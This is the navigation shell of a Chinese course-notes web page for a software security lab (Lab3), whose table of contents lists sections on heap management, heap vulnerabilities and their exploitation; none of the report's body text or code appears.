
<!doctype html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Course Note for ZJU CS">
      
      
        <meta name="author" content="RightBird">
      
      
        <link rel="canonical" href="http://RightBird.io/CourseNote/%E5%A4%A7%E4%BA%8C%E4%B8%8A/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E8%B7%B5/Lab3/Report.html">
      
      
        <link rel="prev" href="../Lab2/Report.html">
      
      
        <link rel="next" href="../Lab4/Report.html">
      
      
      <link rel="icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.22">
    
    
      
        <title>Lab3 - CourseNote</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.84d31ad4.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"JetBrains Mono"}</style>
      
    
    
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css">
    
      <link rel="stylesheet" href="../../../css/extra.css">
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#_1" class="md-skip">
          跳转至
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="页眉">
    <a href="../../../index.html" title="CourseNote" class="md-header__button md-logo" aria-label="CourseNote" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            CourseNote
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Lab3
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="暗色模式"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="暗色模式" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-label="亮色模式"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="亮色模式" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      
      
        <label class="md-header__button md-icon" for="__search">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        </label>
        <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="查找">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            正在初始化搜索引擎
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
      
    
    
      <div class="md-header__source">
        <a href="https://github.com/RightBird/CourseNote" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    CourseNote
  </div>
</a>
      </div>
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
  
    <li class="md-tabs__item">
      <a href="../../../index.html" class="md-tabs__link">
        
  
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      
  
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Grading%20Policy.html" class="md-tabs__link">
          
  
  
    
  
  课程笔记

        </a>
      </li>
    
  

    
  

    
  

      
        
  
  
  
  
    
    
      
  
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../C%2B%2B/C%2B%2B%E5%9F%BA%E7%A1%80/data_type.html" class="md-tabs__link">
          
  
  
    
  
  C++

        </a>
      </li>
    
  

    
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../../index.html" title="CourseNote" class="md-nav__button md-logo" aria-label="CourseNote" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    CourseNote
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/RightBird/CourseNote" title="前往仓库" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M439.6 236.1 244 40.5c-5.4-5.5-12.8-8.5-20.4-8.5s-15 3-20.4 8.4L162.5 81l51.5 51.5c27.1-9.1 52.7 16.8 43.4 43.7l49.7 49.7c34.2-11.8 61.2 31 35.5 56.7-26.5 26.5-70.2-2.9-56-37.3L240.3 199v121.9c25.3 12.5 22.3 41.8 9.1 55-6.4 6.4-15.2 10.1-24.3 10.1s-17.8-3.6-24.3-10.1c-17.6-17.6-11.1-46.9 11.2-56v-123c-20.8-8.5-24.6-30.7-18.6-45L142.6 101 8.5 235.1C3 240.6 0 247.9 0 255.5s3 15 8.5 20.4l195.6 195.7c5.4 5.4 12.7 8.4 20.4 8.4s15-3 20.4-8.4l194.7-194.7c5.4-5.4 8.4-12.8 8.4-20.4s-3-15-8.4-20.4"/></svg>
  </div>
  <div class="md-source__repository">
    CourseNote
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../index.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Home
    
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  
  <span class="md-ellipsis">
    课程笔记
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            课程笔记
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1" checked>
        
          
          <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    大二上
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_1">
            <span class="md-nav__icon md-icon"></span>
            大二上
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_1" >
        
          
          <label class="md-nav__link" for="__nav_2_1_1" id="__nav_2_1_1_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    高级数据结构与算法分析
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1_1">
            <span class="md-nav__icon md-icon"></span>
            高级数据结构与算法分析
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Grading%20Policy.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Grading Policy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%201%20---AVL%20Trees%2C%20Splay%20Trees%2C%20and%20Amortized%20Analysis.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 1 ---AVL Trees, Splay Trees, and Amortized Analysis
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%202%20---Red-Black%20Trees%20and%20B%2B%20Trees.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 2 ---Red-Black Trees and B+ Trees
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%203%20---Inverted%20File%20Index.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 3 ---Inverted File Index
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%204%20---Leftist%20Heaps%20and%20Skew%20Heaps.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 4 ---Leftist Heaps and Skew Heaps
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%205%20---Binomial%20Queue.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 5 ---Binomial Queue
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%206%20---Backtracking.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 6 ---Backtracking
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%207%20---Divide%20and%20Conquer.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 7 ---Divide and Conquer
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%208%20---Dynamic%20Programming.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 8 ---Dynamic Programming
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter%209%20---Greedy.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter 9 ---Greedy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter10%20---NP-Completeness.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter10 ---NP-Completeness
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter11%20---Approximation.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter11 ---Approximation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter12%20---Local%20Search.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter12 ---Local Search
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter13%20---Randomized%20Algorithm.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter13 ---Randomized Algorithm
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter14%20---Parallel%20Algorithms.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter14 ---Parallel Algorithms
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/Chapter15%20---External%20Sorting.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter15 ---External Sorting
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E9%AB%98%E7%BA%A7%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E5%88%86%E6%9E%90/%E4%B9%A0%E9%A2%98.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    习题
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_2" >
        
          
          <label class="md-nav__link" for="__nav_2_1_2" id="__nav_2_1_2_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    计算机组成
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_1_2">
            <span class="md-nav__icon md-icon"></span>
            计算机组成
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/Chapter1%20%20Computer%20Abstractions%20and%20Technology.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter1  Computer Abstractions and Technology
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/Chapter2%20%20Instructions%20Language%20of%20the%20Computer.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter2  Instructions Language of the Computer
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/Chapter3%20%20Arithmetic%20for%20Computer.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter3  Arithmetic for Computer
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/Chapter4%20The%20Processor.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter4 The Processor
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/Chapter5%20Large%20and%20Fast%20Exploiting%20Memory%20Hierarchy.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter5 Large and Fast Exploiting Memory Hierarchy
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90/Chapter6%20Storage%20and%20other%20IO%20Topics.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Chapter6 Storage and other IO Topics
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1_3" checked>
        
          
          <label class="md-nav__link" for="__nav_2_1_3" id="__nav_2_1_3_label" tabindex="0">
            
  
  
  <span class="md-ellipsis">
    软件安全原理与实践
    
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_1_3_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2_1_3">
            <span class="md-nav__icon md-icon"></span>
            软件安全原理与实践
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Lab1/report.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Lab2/Report.html" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Lab2
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  
  <span class="md-ellipsis">
    Lab3
    
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="Report.html" class="md-nav__link md-nav__link--active">
        
  
  
  <span class="md-ellipsis">
    Lab3
    
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="目录">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      目录
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_2" class="md-nav__link">
    <span class="md-ellipsis">
      堆管理器基础
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_4" class="md-nav__link">
    <span class="md-ellipsis">
      堆上常见漏洞
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_5" class="md-nav__link">
    <span class="md-ellipsis">
      堆上漏洞的利用
    </span>
  </a>
  
</li>
      
